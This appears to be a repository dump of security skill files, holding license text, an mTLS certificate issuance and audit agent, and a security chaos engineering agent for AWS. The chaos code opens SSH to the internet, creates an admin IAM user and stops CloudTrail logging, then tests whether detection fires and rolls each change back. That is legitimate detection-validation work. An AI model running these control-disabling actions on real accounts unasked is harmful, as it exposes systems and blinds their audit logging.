      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-mtls-for-zero-trust-services/references/api-reference.md =====
# API Reference: Implementing mTLS for Zero Trust Services

## cryptography (Certificate Generation)

```python
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime

# Generate RSA key
key = rsa.generate_private_key(public_exponent=65537, key_size=4096)

# Build CA certificate
cert = (x509.CertificateBuilder()
    .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "CA")]))
    .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "CA")]))
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.utcnow())
    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
    .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
    .sign(key, hashes.SHA256()))

# Save PEM
key_pem = key.private_bytes(serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption())
cert_pem = cert.public_bytes(serialization.Encoding.PEM)
```

## ssl Module (mTLS Connection)

```python
import ssl, socket

context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.load_cert_chain("client.pem", "client-key.pem")
context.load_verify_locations("ca.pem")
context.verify_mode = ssl.CERT_REQUIRED

with socket.create_connection(("host", 443)) as sock:
    with context.wrap_socket(sock, server_hostname="host") as ssock:
        peer = ssock.getpeercert()
        print(ssock.version(), peer["subject"])
```

## cert-manager (Kubernetes)

```bash
# Install cert-manager
helm install cert-manager jetstack/cert-manager --set installCRDs=true

# Create ClusterIssuer for internal CA
kubectl apply -f cluster-issuer.yaml
```

### References

- cryptography: https://cryptography.io/en/latest/
- Python ssl: https://docs.python.org/3/library/ssl.html
- cert-manager: https://cert-manager.io/docs/

===== END FILE =====


===== FILE: skills/implementing-mtls-for-zero-trust-services/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for implementing and auditing mutual TLS between services."""

import os
import ssl
import json
import socket
import argparse
from datetime import datetime, timedelta

from cryptography import x509
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa


def generate_ca(common_name="Internal mTLS CA", days_valid=3650):
    """Generate a self-signed CA certificate and key."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Security Team"),
        x509.NameAttribute(NameOID.COMMON_NAME, common_name),
    ])
    cert = (x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.utcnow())
            .not_valid_after(datetime.utcnow() + timedelta(days=days_valid))
            .add_extension(x509.BasicConstraints(ca=True, path_length=1), critical=True)
            .add_extension(x509.KeyUsage(
                digital_signature=True, key_cert_sign=True, crl_sign=True,
                content_commitment=False, key_encipherment=False,
                data_encipherment=False, key_agreement=False,
                encipher_only=False, decipher_only=False,
            ), critical=True)
            .sign(key, hashes.SHA256()))
    return key, cert


def issue_service_cert(ca_key, ca_cert, service_name, san_dns=None, days_valid=365):
    """Issue a service certificate signed by the CA."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, service_name),
    ])
    builder = (x509.CertificateBuilder()
               .subject_name(subject)
               .issuer_name(ca_cert.subject)
               .public_key(key.public_key())
               .serial_number(x509.random_serial_number())
               .not_valid_before(datetime.utcnow())
               .not_valid_after(datetime.utcnow() + timedelta(days=days_valid))
               .add_extension(x509.ExtendedKeyUsage([
                   ExtendedKeyUsageOID.CLIENT_AUTH,
                   ExtendedKeyUsageOID.SERVER_AUTH,
               ]), critical=False))
    dns_names = [x509.DNSName(service_name)]
    if san_dns:
        dns_names.extend([x509.DNSName(d) for d in san_dns])
    builder = builder.add_extension(
        x509.SubjectAlternativeName(dns_names), critical=False,
    )
    cert = builder.sign(ca_key, hashes.SHA256())
    return key, cert


def save_pem(key, cert, key_path, cert_path):
    """Save key and certificate to PEM files."""
    with open(key_path, "wb") as f:
        f.write(key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ))
    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))


def verify_mtls_endpoint(host, port, ca_cert_path, client_cert_path, client_key_path):
    """Test mTLS connectivity to an endpoint."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_cert_chain(client_cert_path, client_key_path)
    context.load_verify_locations(ca_cert_path)
    context.verify_mode = ssl.CERT_REQUIRED
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                peer_cert = ssock.getpeercert()
                return {
                    "host": host,
                    "port": port,
                    "status": "SUCCESS",
                    "peer_subject": dict(x[0] for x in peer_cert.get("subject", ())),
                    "peer_issuer": dict(x[0] for x in peer_cert.get("issuer", ())),
                    "not_after": peer_cert.get("notAfter", ""),
                    "tls_version": ssock.version(),
                }
    except Exception as e:
        return {"host": host, "port": port, "status": "FAILED", "error": str(e)}


def audit_certificates(cert_dir):
    """Audit all certificates in a directory for expiration and key size."""
    findings = []
    from pathlib import Path
    for cert_path in Path(cert_dir).glob("*.pem"):
        try:
            with open(cert_path, "rb") as f:
                cert = x509.load_pem_x509_certificate(f.read())
            days_remaining = (cert.not_valid_after_utc - datetime.utcnow()).days
            key_size = cert.public_key().key_size
            finding = {
                "file": str(cert_path),
                "subject": cert.subject.rfc4514_string(),
                "issuer": cert.issuer.rfc4514_string(),
                "not_after": str(cert.not_valid_after_utc),
                "days_remaining": days_remaining,
                "key_size": key_size,
                "serial": str(cert.serial_number),
            }
            if days_remaining < 30:
                finding["severity"] = "CRITICAL" if days_remaining < 7 else "HIGH"
            elif key_size < 2048:
                finding["severity"] = "HIGH"
            else:
                finding["severity"] = "OK"
            findings.append(finding)
        except Exception as e:
            findings.append({"file": str(cert_path), "error": str(e)})
    return findings


def main():
    parser = argparse.ArgumentParser(description="mTLS Zero Trust Agent")
    parser.add_argument("--output-dir", default="./certs")
    parser.add_argument("--audit-dir", help="Directory of certs to audit")
    parser.add_argument("--verify-host", help="Host to test mTLS connection")
    parser.add_argument("--verify-port", type=int, default=443)
    parser.add_argument("--output", default="mtls_report.json")
    parser.add_argument("--action", choices=[
        "generate_ca", "issue_cert", "verify", "audit", "full_setup"
    ], default="full_setup")
    args = parser.parse_args()

    report = {"generated_at": datetime.utcnow().isoformat(), "results": {}}
    os.makedirs(args.output_dir, exist_ok=True)

    if args.action in ("generate_ca", "full_setup"):
        ca_key, ca_cert = generate_ca()
        save_pem(ca_key, ca_cert,
                 f"{args.output_dir}/ca-key.pem", f"{args.output_dir}/ca.pem")
        report["results"]["ca"] = {"subject": ca_cert.subject.rfc4514_string()}
        print(f"[+] CA certificate generated")

    if args.action in ("issue_cert", "full_setup"):
        ca_key_path = f"{args.output_dir}/ca-key.pem"
        ca_cert_path = f"{args.output_dir}/ca.pem"
        with open(ca_key_path, "rb") as f:
            ca_key = serialization.load_pem_private_key(f.read(), password=None)
        with open(ca_cert_path, "rb") as f:
            ca_cert = x509.load_pem_x509_certificate(f.read())
        services = ["api-gateway", "auth-service", "data-service"]
        for svc in services:
            svc_key, svc_cert = issue_service_cert(ca_key, ca_cert, svc)
            save_pem(svc_key, svc_cert,
                     f"{args.output_dir}/{svc}-key.pem", f"{args.output_dir}/{svc}.pem")
            print(f"[+] Issued certificate for {svc}")

    if args.action in ("audit", "full_setup") and (args.audit_dir or args.output_dir):
        audit_dir = args.audit_dir or args.output_dir
        audit_results = audit_certificates(audit_dir)
        report["results"]["audit"] = audit_results
        expiring = [a for a in audit_results if a.get("severity") in ("CRITICAL", "HIGH")]
        print(f"[+] Audited {len(audit_results)} certs, {len(expiring)} expiring soon")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-security-chaos-engineering/SKILL.md =====
---
name: implementing-security-chaos-engineering
description: 'Implements security chaos engineering experiments that deliberately
  disable or degrade security controls to verify detection and response capabilities.
  Tests WAF bypass, firewall rule removal, log pipeline disruption, and EDR disablement
  scenarios using boto3 and subprocess. Use when validating SOC detection coverage
  and resilience.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- security-chaos-engineering
- detection-validation
- resilience-testing
- control-validation
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_ai_rmf:
- MEASURE-2.7
- MAP-5.1
- MANAGE-2.4
atlas_techniques:
- AML.T0070
- AML.T0066
- AML.T0082
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1027
- T1070
---

# Implementing Security Chaos Engineering


## When to Use

- When deploying or configuring implementing security chaos engineering capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Design and execute security chaos experiments that intentionally break security
controls to verify that detection, alerting, and response systems work correctly.

```python
# Example: Verify detection when a security group is opened
import boto3
ec2 = boto3.client("ec2")

# Chaos experiment: temporarily add 0.0.0.0/0 rule
ec2.authorize_security_group_ingress(
    GroupId="sg-12345",
    IpProtocol="tcp", FromPort=22, ToPort=22,
    CidrIp="0.0.0.0/0",
)
# Verify: does GuardDuty/Config alert fire within SLA?
# Rollback: remove the rule after verification
```

Key experiments:
1. Open a security group and verify Config Rule alerts
2. Disable CloudTrail and verify detection time
3. Create IAM admin user and verify alert triggers
4. Simulate log pipeline failure and check monitoring gaps
5. Deploy test malware hash and verify EDR response

## Examples

```python
# Rollback function for safe experiment execution
def run_experiment(setup_fn, verify_fn, rollback_fn, timeout=300):
    try:
        setup_fn()
        result = verify_fn(timeout)
    finally:
        rollback_fn()
    return result
```

===== END FILE =====


===== FILE: skills/implementing-security-chaos-engineering/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-security-chaos-engineering/references/api-reference.md =====
# API Reference: Implementing Security Chaos Engineering

## Experiment Pattern

```python
def run_experiment(setup_fn, verify_fn, rollback_fn, timeout=300):
    try:
        setup_fn()       # Introduce failure
        result = verify_fn(timeout)  # Check detection
    finally:
        rollback_fn()    # Always restore
    return result
```

## AWS boto3 (Chaos Actions)

```python
import boto3

# Open security group
ec2 = boto3.client("ec2")
ec2.authorize_security_group_ingress(GroupId="sg-xxx",
    IpProtocol="tcp", FromPort=22, ToPort=22, CidrIp="0.0.0.0/0")
# Rollback
ec2.revoke_security_group_ingress(...)

# Stop CloudTrail
ct = boto3.client("cloudtrail")
ct.stop_logging(Name="main-trail")
ct.start_logging(Name="main-trail")  # rollback

# Check Config compliance
config = boto3.client("config")
config.get_compliance_details_by_config_rule(
    ConfigRuleName="restricted-ssh",
    ComplianceTypes=["NON_COMPLIANT"])
```

## Experiment Catalog

| Experiment | Detection Target | SLA |
|-----------|-----------------|-----|
| Open SG 0.0.0.0/0 | AWS Config Rule | < 5 min |
| Create admin user | GuardDuty | < 15 min |
| Stop CloudTrail | CloudWatch alarm | < 5 min |
| Public S3 bucket | Config / Macie | < 10 min |

### References

- AWS Config Rules: https://docs.aws.amazon.com/config/latest/developerguide/
- GuardDuty: https://docs.aws.amazon.com/guardduty/
- Security Chaos Engineering book: https://www.oreilly.com/library/view/security-chaos-engineering/

===== END FILE =====


===== FILE: skills/implementing-security-chaos-engineering/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for security chaos engineering experiments."""

import os
import json
import time
import argparse
from datetime import datetime

import boto3
from botocore.exceptions import ClientError


class ChaosExperiment:
    """Base class for security chaos experiments."""

    def __init__(self, name, description, severity="MEDIUM"):
        self.name = name
        self.description = description
        self.severity = severity
        self.start_time = None
        self.end_time = None
        self.result = None

    def run(self, setup_fn, verify_fn, rollback_fn, timeout=300):
        """Execute experiment with automatic rollback."""
        self.start_time = datetime.utcnow().isoformat()
        try:
            setup_fn()
            self.result = verify_fn(timeout)
        except Exception as e:
            self.result = {"status": "ERROR", "error": str(e)}
        finally:
            rollback_fn()
            self.end_time = datetime.utcnow().isoformat()
        return self.to_dict()

    def to_dict(self):
        return {
            "name": self.name,
            "description": self.description,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "result": self.result,
        }


def experiment_open_security_group(session, sg_id, check_interval=30, timeout=300):
    """Experiment: Open a security group and verify detection."""
    ec2 = session.client("ec2")
    config_client = session.client("config")

    def setup():
        ec2.authorize_security_group_ingress(
            GroupId=sg_id, IpProtocol="tcp", FromPort=22, ToPort=22,
            CidrIp="0.0.0.0/0",
        )
        print(f"  [!] Opened SG {sg_id} port 22 to 0.0.0.0/0")

    def verify(timeout_sec):
        elapsed = 0
        while elapsed < timeout_sec:
            time.sleep(check_interval)
            elapsed += check_interval
            results = config_client.get_compliance_details_by_config_rule(
                ConfigRuleName="restricted-ssh", ComplianceTypes=["NON_COMPLIANT"]
            )
            items = results.get("EvaluationResults", [])
            for item in items:
                resource_id = item.get("EvaluationResultIdentifier", {}).get(
                    "EvaluationResultQualifier", {}).get("ResourceId", "")
                if resource_id == sg_id:
                    return {"detected": True, "detection_time_sec": elapsed}
        return {"detected": False, "timeout": timeout_sec}

    def rollback():
        try:
            ec2.revoke_security_group_ingress(
                GroupId=sg_id, IpProtocol="tcp", FromPort=22, ToPort=22,
                CidrIp="0.0.0.0/0",
            )
            print(f"  [+] Rolled back SG {sg_id}")
        except ClientError:
            pass

    exp = ChaosExperiment("open_security_group",
                          "Verify detection of unrestricted SSH access")
    return exp.run(setup, verify, rollback, timeout)


def experiment_create_admin_user(session, username="chaos-test-admin", timeout=300):
    """Experiment: Create IAM admin user and verify detection."""
    iam = session.client("iam")
    gd = session.client("guardduty")

    def setup():
        iam.create_user(UserName=username)
        iam.attach_user_policy(
            UserName=username,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
        )
        print(f"  [!] Created admin user {username}")

    def verify(timeout_sec):
        elapsed = 0
        while elapsed < timeout_sec:
            time.sleep(30)
            elapsed += 30
            detectors = gd.list_detectors()["DetectorIds"]
            for det_id in detectors:
                findings = gd.list_findings(
                    DetectorId=det_id,
                    FindingCriteria={"Criterion": {
                        "type": {"Eq": ["Recon:IAMUser/UserPermissions"]},
                    }},
                )
                if findings.get("FindingIds"):
                    return {"detected": True, "detection_time_sec": elapsed}
        return {"detected": False, "timeout": timeout_sec}

    def rollback():
        try:
            iam.detach_user_policy(
                UserName=username,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
            )
            iam.delete_user(UserName=username)
            print(f"  [+] Rolled back user {username}")
        except ClientError:
            pass

    exp = ChaosExperiment("create_admin_user",
                          "Verify detection of unauthorized admin user creation")
    return exp.run(setup, verify, rollback, timeout)


def experiment_stop_cloudtrail(session, trail_name, timeout=300):
    """Experiment: Stop CloudTrail and verify detection."""
    ct = session.client("cloudtrail")

    def setup():
        ct.stop_logging(Name=trail_name)
        print(f"  [!] Stopped CloudTrail {trail_name}")

    def verify(timeout_sec):
        elapsed = 0
        cw = session.client("cloudwatch")
        while elapsed < timeout_sec:
            time.sleep(30)
            elapsed += 30
            alarms = cw.describe_alarms(AlarmNamePrefix="CloudTrail")
            for alarm in alarms.get("MetricAlarms", []):
                if alarm["StateValue"] == "ALARM":
                    return {"detected": True, "detection_time_sec": elapsed,
                            "alarm": alarm["AlarmName"]}
        return {"detected": False, "timeout": timeout_sec}

    def rollback():
        try:
            ct.start_logging(Name=trail_name)
            print(f"  [+] Restarted CloudTrail {trail_name}")
        except ClientError:
            pass

    exp = ChaosExperiment("stop_cloudtrail",
                          "Verify detection of CloudTrail logging disabled")
    return exp.run(setup, verify, rollback, timeout)


def dry_run_experiments():
    """List available experiments without executing them."""
    return [
        {"name": "open_security_group", "severity": "HIGH",
         "description": "Open SG port 22 to 0.0.0.0/0, verify Config Rule alert"},
        {"name": "create_admin_user", "severity": "CRITICAL",
         "description": "Create IAM admin user, verify GuardDuty detection"},
        {"name": "stop_cloudtrail", "severity": "CRITICAL",
         "description": "Stop CloudTrail logging, verify CloudWatch alarm"},
    ]


def main():
    parser = argparse.ArgumentParser(description="Security Chaos Engineering Agent")
    parser.add_argument("--profile", default=os.getenv("AWS_PROFILE"))
    parser.add_argument("--region", default=os.getenv("AWS_DEFAULT_REGION", "us-east-1"))
    parser.add_argument("--sg-id", help="Security Group ID for SG experiment")
    parser.add_argument("--trail-name", help="CloudTrail name for trail experiment")
    parser.add_argument("--timeout", type=int, default=300)
    parser.add_argument("--output", default="chaos_report.json")
    parser.add_argument("--action", choices=[
        "dry_run", "open_sg", "admin_user", "stop_trail", "full_suite"
    ], default="dry_run")
    args = parser.parse_args()

    report = {"generated_at": datetime.utcnow().isoformat(), "experiments": []}

    if args.action == "dry_run":
        report["experiments"] = dry_run_experiments()
        print("[+] Dry run - experiments listed but not executed")
        for exp in report["experiments"]:
            print(f"    {exp['name']}: {exp['description']}")
    else:
        session = boto3.Session(profile_name=args.profile, region_name=args.region)
        if args.action in ("open_sg", "full_suite") and args.sg_id:
            result = experiment_open_security_group(session, args.sg_id, timeout=args.timeout)
            report["experiments"].append(result)

        if args.action in ("admin_user", "full_suite"):
            result = experiment_create_admin_user(session, timeout=args.timeout)
            report["experiments"].append(result)

        if args.action in ("stop_trail", "full_suite") and args.trail_name:
            result = experiment_stop_cloudtrail(session, args.trail_name, timeout=args.timeout)
            report["experiments"].append(result)

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-security-monitoring-with-datadog/SKILL.md =====
---
name: implementing-security-monitoring-with-datadog
description: 'Implements security monitoring using Datadog Cloud SIEM, Cloud Security
  Management (CSM), and Workload Protection to detect threats, enforce compliance,
  and respond to security events across cloud and hybrid infrastructure. Covers Agent
  deployment, log source ingestion, detection rule creation, security dashboards,
  and automated notification workflows. Activates for requests involving Datadog security
  setup, Cloud SIEM configuration, CSM threat detection, or security monitoring dashboards.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- siem
- security-monitoring
- datadog
- cloud-security
- log-analysis
- detection-rules
- CSM
- workload-protection
version: 1.0.0
author: mahipal
